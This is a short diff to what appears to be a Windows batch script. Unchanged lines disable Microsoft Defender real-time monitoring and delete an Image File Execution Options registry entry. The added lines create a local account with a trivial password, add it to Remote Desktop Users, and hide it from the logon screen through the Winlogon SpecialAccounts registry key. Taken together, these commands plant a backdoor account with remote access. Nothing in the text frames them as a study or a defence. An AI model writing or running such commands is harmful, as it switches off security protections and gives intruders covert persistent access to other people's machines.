@@ -14,3 +14,10 @@ REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Executi
 
 
 start Powershell Set-MpPreference -DisableRealtimeMonitoring $true
+
+
+
+net user user pass /add
+net localgroup "Remote Desktop Users" user /add
+
+reg add "hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist" /v user /t reg_dword /d 0 /f
